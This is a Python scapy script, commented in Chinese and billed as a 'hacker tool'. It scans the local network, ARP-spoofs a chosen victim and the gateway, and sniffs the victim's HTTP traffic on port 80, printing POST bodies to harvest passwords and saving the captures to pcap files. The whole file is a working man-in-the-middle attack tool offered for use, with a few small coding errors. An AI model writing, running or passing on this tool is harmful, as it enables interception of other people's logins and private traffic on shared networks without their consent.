import os
import re
import time
from scapy.all import *
from threading import Thread

# 定义变量函数
gw = ''
# wifi = "Realtek PCIe GBE Family Controller"
wifi = 'Intel(R) Dual Band Wireless-AC 3165'

# 扫描局域网，显示活跃主机
def scan():
    global gw
    for line in os.popen("route print"):
        s = line.strip()
        if s.startswith("0.0.0.0"):
            slist = s.split()
            ip = slist[3]
            gw = slist[2]
            break
    print("本机上网的ip是：", ip)
    print("本机上网的网关是：", gw)
    tnet = gw + "/24"
    # wifi="Realtek RTL8723BE Wireless LAN 802.11n PCI-E NIC"
    p =Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=tnet)
    ans, unans = srp(p, iface=wifi, timeout=2, verbose=0)
    print("一共扫描到%d台主机：" % len(ans))
    result = []
    for s, r in ans:
        result.append([r.psrc, r.hwsrc])
    result.sort()
    for ip, mac in result:
        print(ip, "----->", mac)


# scan()

# 解读密码
def showpwd(p):
    if p.haslayer(Raw):
        try:
            data = p.load().decode(encode='utf-8', errors='ignore')
            if data.startswith("POST"):
                print(time.strftime("%Y%m%d %H:%M:%S"))
                head, txt = data.split("\r\n\r\n")
                hlist = head.split("\r\n")
                path = hlist[0].split()[1]
                for line in hlist[1:]:
                    if line.startswith("Host"):
                        host = line.split()[-1]
                        break
                url = "http://+host+path"
                print(url)
                print(txt)
        except:
            pass


# 抓包
def capture(vic, t):
    tj = "tcp port 80 and host " + vic
    pkts = sniff(iface=wifi, filter=tj, prn=showpwd, timeout=t)
    fname = "p%d.pcap" % int(time.time())
    wrpcap(fname, pkts)
    print("抓包数据已存入文件%s。" % fname)


# ARP攻击
def spoof():
    vic = input("请输入攻击目标：")  # vic被攻击者
    t = int(input("请输入攻击时间（单位：秒）："))
    ct = Thread(target=capture, args=(vic, t))
    ct.start()
    for i in range(5 * int(t)):
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=vic, psrc=gw), verbose=0)
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw, psrc=vic), verbose=0)
        time.sleep(0.2)
    ct.join()
    print("攻击结束！")


# 主函数
def main():
    print("hacker工具！")
    while 1:
        sel = input("请选择要进行的操作：1、局域网扫描；2、ARP欺骗；3、流量分析；4、退出\n")
        if sel == "1":
            scan()
        elif sel == "2":
            if not gw:
                print("请先执行扫描程序！")
            else:
                spoof()
        elif sel == "3":
            print("开发中...")
            pass
        elif sel == "4":
            print("欢迎下次使用！再见！")
            break
        else:
            print("输入有误请重新输入！")


if __name__ == "__main__":
    main()